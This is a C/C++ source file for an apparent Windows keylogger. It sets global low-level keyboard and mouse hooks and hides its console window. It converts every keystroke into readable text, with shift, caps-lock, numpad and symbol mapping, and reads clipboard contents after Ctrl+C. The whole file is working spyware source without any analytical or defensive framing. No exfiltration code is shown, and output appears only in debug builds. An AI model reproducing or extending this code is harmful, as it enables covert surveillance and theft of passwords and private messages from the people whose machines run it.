//Win Macros
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

//Win Headers
#include <windows.h>
#include <winuser.h>

//C Headers
#include <stdio.h>
#include <inttypes.h>

// #define DEBUG 1

//Debug Headers
#ifdef DEBUG
    #include <iostream>
#endif

#define LPSTR_SIZE 0xFF
#define MAX_BUFLEN 5120
#define FNV_PRIME 16777619
#define FNV_OFFSET_BASIS 2166136261

//Global variables
HHOOK mousehook;
HHOOK keyboardhook;
KBDLLHOOKSTRUCT kbd_struct;
MSLLHOOKSTRUCT mouse_struct;


//Callback functions
LRESULT WINAPI HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);


void StealthConsole();
void SetMouseHook();
void SetKeyboardHook();
void SetHooks();
void ReleaseMouseHook();
void ReleaseKeyboardHook();
void ReleaseHooks();
bool IfPrintable(char* str);
void CheckNumpad(char* str, bool numlock, bool shortcut);
void CheckSpecialChar(char *str);
void GetClipboardContent();
uint32_t hash(char* str);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MSG msg;

    SetHooks();
    StealthConsole();

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        mouse_struct = *((MSLLHOOKSTRUCT*)lParam);

        // std::cout << "x: " << mouse_struct.pt.x << "\ty: " << mouse_struct.pt.y << "\n";

        switch (wParam) {
            case WM_LBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[LMB DOWN]\n";
#endif
            break;

            case WM_LBUTTONUP:
#ifdef DEBUG
            std::cout << "[LMB UP]\n";
#endif
            break;

            case WM_RBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[RMB DOWN]\n";
#endif
            break;

            case WM_RBUTTONUP:
#ifdef DEBUG
            std::cout << "[RMB UP]\n";
#endif
            break;

            case WM_MBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[MMB DOWN]\n";
#endif
            break;

            case WM_MBUTTONUP:
#ifdef DEBUG
            std::cout << "[MMB UP]\n";
#endif
            break;

            case WM_MOUSEWHEEL:
            short rotation = (short)HIWORD(mouse_struct.mouseData);
            if (rotation > 0) {
#ifdef DEBUG
                std::cout << "[FWD ROTATE " << rotation << "]\n";
#endif        
            }
            else {
#ifdef DEBUG
                std::cout << "[BWD ROTATE" << rotation << "]\n";
#endif
            }
        }
    }

    return CallNextHookEx(mousehook, nCode, wParam, lParam);
}

LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        static bool capslock = GetKeyState(VK_CAPITAL);
        static bool shift = false;
        static bool numlock = GetKeyState(VK_NUMLOCK);
        static bool ctrl = GetKeyState(VK_CONTROL);
        static bool clipboard = false;
        bool shortcut = false;
        kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
        char str[LPSTR_SIZE] = {0};
        DWORD msg = 1;
        bool printable;

        //Bits position from docs
        msg += (kbd_struct.scanCode << 16);
        if (kbd_struct.vkCode == 0xA1) {
            msg += ((kbd_struct.flags^LLKHF_EXTENDED) << 24);
        }
        else {
            msg += (kbd_struct.flags << 24);
        }
        GetKeyNameText(msg, str, LPSTR_SIZE);
        // std::cout << "DEBUG:\t" << str << "\tvk:\t" << kbd_struct.vkCode << "\tscan:\t" << kbd_struct.scanCode << "\tflag:\t" << kbd_struct.flags << "\n";   
        // std::cout << "TEST:\t" << (kbd_struct.flags & LLKHF_EXTENDED) << /*"\txor:\t" << (kbd_struct.flags ^ LLKHF_EXTENDED) <<*/ "\n";    

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << "\nDEBUG: " << str << "\n Caps: " << capslock << "\n Shift: " << shift << "\n";
            printable = IfPrintable(str);

            if (!printable) {
                if (strcmp(str, "Caps Lock") == 0) {
                    capslock = !capslock;
                }
                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                    shift = true;
                }
                else if (strcmp(str, "Num Lock") == 0) {
                    numlock = !numlock;
                }
                else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
                    ctrl = true;
                }

                if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                    strncpy(str, "\n", LPSTR_SIZE);
                    shortcut = true;
                }
                else if (strcmp(str, "Space") == 0) {
                    strncpy(str, " ", LPSTR_SIZE);
                    shortcut = true;
                }
                else if (strcmp(str, "Tab") == 0) {
                    strncpy(str, "\t", LPSTR_SIZE);
                    shortcut = true;
                }
                else {
                    char tmp[LPSTR_SIZE] = {0};
                    snprintf(tmp, LPSTR_SIZE, "[%s]", str);
                    strncpy(str, tmp, LPSTR_SIZE);
                }
                CheckNumpad(str, numlock, shortcut);
            }

            else if (printable) {
                int val = int(str[0]);
                if ((val >= 65) && (val <= 90)) {
                    if (shift == capslock) {
                        str[0] = tolower(str[0]);

                        if (val == 67 && ctrl) {
                            clipboard = true;
                        }
                    }
                }
                else {
                    if (shift) {
                        CheckSpecialChar(str);
                    }
                }
            }
#ifdef DEBUG
            std::cout << str;
#endif
        }
        else if(wParam == WM_KEYUP) {
            if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                shift = false;
            }
            else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
                ctrl = false;
            }
            if (clipboard) {
                GetClipboardContent();
                clipboard = false;
            }
        }
    }

    return CallNextHookEx(keyboardhook, nCode, wParam, lParam);
}

void StealthConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    
#ifdef DEBUG
    ShowWindow(stealth, SW_SHOWNORMAL); 
#else
    ShowWindow(stealth, SW_HIDE); 
#endif
}

void SetMouseHook() {
    if (!(mousehook = SetWindowsHookEx(WH_MOUSE_LL, HookMouseCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install mouse hook!\n";
#endif
    }
}

void SetKeyboardHook() {
    if (!(keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install keyboard hook!\n";
#endif
    }
}

void SetHooks() {
    SetMouseHook();
    SetKeyboardHook();
}

void ReleaseMouseHook() {
    UnhookWindowsHookEx(mousehook);
}

void ReleaseKeyboardHook() {
    UnhookWindowsHookEx(keyboardhook);
}

void ReleaseHooks() {
    ReleaseMouseHook();
    ReleaseKeyboardHook();
}

bool IfPrintable(char* str) {
    return ((strlen(str) <= 1) ? true : false);
}

void CheckNumpad(char* str, bool numlock, bool shortcut) {
    //Cause there is no known method to me to map it automatically,
    //I have to do it manually
    //Not using C++ map, bcs of binary size
    //Using hardcoded hashes, bcs it should be faster than if & strcmp
    uint32_t hashed = hash(str);

    if (numlock && !shortcut) {
        switch (hashed) {
            case 468635197:
            strncpy(str, "0", LPSTR_SIZE);
            break;

            case 3622871496:
            strncpy(str, "1", LPSTR_SIZE);
            break;

            case 3622430211:
            strncpy(str, "2", LPSTR_SIZE);
            break;

            case 3689687782:
            strncpy(str, "3", LPSTR_SIZE);
            break;

            case 467943649:
            strncpy(str, "4", LPSTR_SIZE);
            break;

            case 400980268:
            strncpy(str, "5", LPSTR_SIZE);
            break;

            case 3621738663:
            strncpy(str, "6", LPSTR_SIZE);
            break;

            case 3688996234:
            strncpy(str, "7", LPSTR_SIZE);
            break;

            case 3691114805:
            strncpy(str, "8", LPSTR_SIZE);
            break;

            case 3624151424:
            strncpy(str, "9", LPSTR_SIZE);
            break;

            case 414182630:
            strncpy(str, "[,]", LPSTR_SIZE);
            break;
        }
    }
    else if (!shortcut) {
        switch (hashed) {
            case 468635197:
            strncpy(str, "[Insert]", LPSTR_SIZE);
            break;

            case 3622871496:
            strncpy(str, "[End]", LPSTR_SIZE);
            break;

            case 3622430211:
            strncpy(str, "[Down]", LPSTR_SIZE);
            break;

            case 3689687782:
            strncpy(str, "[Page Down]", LPSTR_SIZE);
            break;

            case 467943649:
            strncpy(str, "[Left]", LPSTR_SIZE);
            break;

            case 400980268:
            strncpy(str, "[]", LPSTR_SIZE);
            break;

            case 3621738663:
            strncpy(str, "[Right]", LPSTR_SIZE);
            break;

            case 3688996234:
            strncpy(str, "[Home]", LPSTR_SIZE);
            break;

            case 3691114805:
            strncpy(str, "[Up]", LPSTR_SIZE);
            break;

            case 3624151424:
            strncpy(str, "[Page Up]", LPSTR_SIZE);
            break;
        }
    }

    switch (hashed) {
        case 472327886:
        strncpy(str, "+", LPSTR_SIZE);
        break;

        case 3626122900:
        strncpy(str, "-", LPSTR_SIZE);
        break;

        case 3626269995:
        strncpy(str, "*", LPSTR_SIZE);
        break;

        case 3692939186:
        strncpy(str, "/", LPSTR_SIZE);
        break;
    }
}

void CheckSpecialChar(char* str) {
    //Same situation - function not available, map too big
    //Numbers are hardcoded hashes, single char comparison is probably better,
    //but I have to test it
    // uint32_t hashed = hash(str);
    
    if (str[0] == '1') {            //873244444
        str[0] = '!';
    }
    else if (str[0] == '2') {       //923577301
        str[0] = '@';
    }
    else if (str[0] == '3') {       //906799682
        str[0] = '#';
    }
    else if (str[0] == '4') {       //822911587
        str[0] = '$';
    }
    else if (str[0] == '5') {       //806133968
        str[0] = '%';
    }
    else if (str[0] == '6') {       //856466825
        str[0] = '^';
    }
    else if (str[0] == '7') {       //839689206
        str[0] = '&';
    }
    else if (str[0] == '8') {       //1024243015
        str[0] = '*';
    }
    else if (str[0] == '9') {       //1007465396
        str[0] = '(';
    }
    else if (str[0] == '0') {       //890022063
        str[0] = ')';
    }
    else if (str[0] == '-') {       //671913016
        str[0] = '_';
    }
    else if (str[0] == '=') {       //940354920
        str[0] = '+';
    }
    else if (str[0] == '[') {       //3725336506
        str[0] = '{';
    }
    else if (str[0] == ']') {       //3624670792
        str[0] = '}';
    }
    else if (str[0] == '\\') {      //3641448411
        str[0] = '|';
    }
    else if (str[0] == ';') {       //1041020634
        str[0] = ':';
    }
    else if (str[0] == '\'') {      //571247302
        str[0] = '"';
    }
    else if (str[0] == ',') {       //688690635
        str[0] = '<';
    }
    else if (str[0] == '.') {       //72245873
        str[0] = '>';
    }
    else if (str[0] == '/') {       //705468254
        str[0] = '?';
    }
}

void GetClipboardContent() {
    HANDLE clip;
    LPSTR pText;
    char text[MAX_BUFLEN];

    if (OpenClipboard(NULL)) {
        clip = GetClipboardData(CF_TEXT);
        if (clip == NULL) {
            CloseClipboard();
            return;
        }
        
        pText = (LPSTR)GlobalLock(clip);
        if (pText == NULL) {
            GlobalUnlock(clip);
            CloseClipboard();
            return;
        }

        strncpy(text, pText, MAX_BUFLEN);
        GlobalUnlock(clip);
        CloseClipboard();
    }
    else {
#ifdef DEBUG
        std::cout << "Failed to get clipboard content!\n";
#endif
        return;
    }
    char result[MAX_BUFLEN] = {0};
    snprintf(result, MAX_BUFLEN, "[CB:%s]", text);
#ifdef DEBUG
    std::cout << result << "\n";
#endif
}

uint32_t hash(char* str) {
    //FNV-1a
    uint32_t hash = FNV_OFFSET_BASIS;
    int byte;

    while (byte = *str++) {
        hash ^= byte;
        hash *= FNV_PRIME;
    }

    return hash;
}